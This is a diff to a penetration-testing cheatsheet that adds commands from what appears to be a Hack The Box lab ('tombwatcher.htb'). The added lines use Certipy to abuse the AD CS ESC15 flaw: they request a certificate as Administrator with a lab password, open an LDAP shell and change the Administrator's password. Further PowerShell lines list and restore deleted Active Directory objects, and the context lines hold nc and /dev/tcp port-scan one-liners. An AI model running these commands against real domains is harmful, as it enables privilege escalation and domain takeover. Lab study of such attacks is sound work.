@@ -1,5 +1,11 @@
 # CHEATSHEETS
 
+
+certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Qwer1234' -dc-ip 10.129.255.131 -target DC01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'Administrator' -application-policies 'Client Authentication'	# Certipy-AD ESC 15 - POLICIES
+certipy-ad auth -pfx administrator.pfx -domain tombwatcher.htb -dc-ip 10.129.255.131 -ldap-shell	# certipy-ad get ldap shell # Chanfge Password change_password Administrator Qwer1234
+Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Property * | Format-List Name,ObjectGUID,Deleted,DistinguishedName	# Deleted Objects - RecycleBin
+Restore-ADObject -Identity c1f1f0fe-df9c-494c-bf05-0679e181b358	# restore deleted objects | recyclebin
+
 # PORT SCAN | discovery
 for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt	# port scan oneliner BASH
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done 	# port scanner oneliner WINDOWS
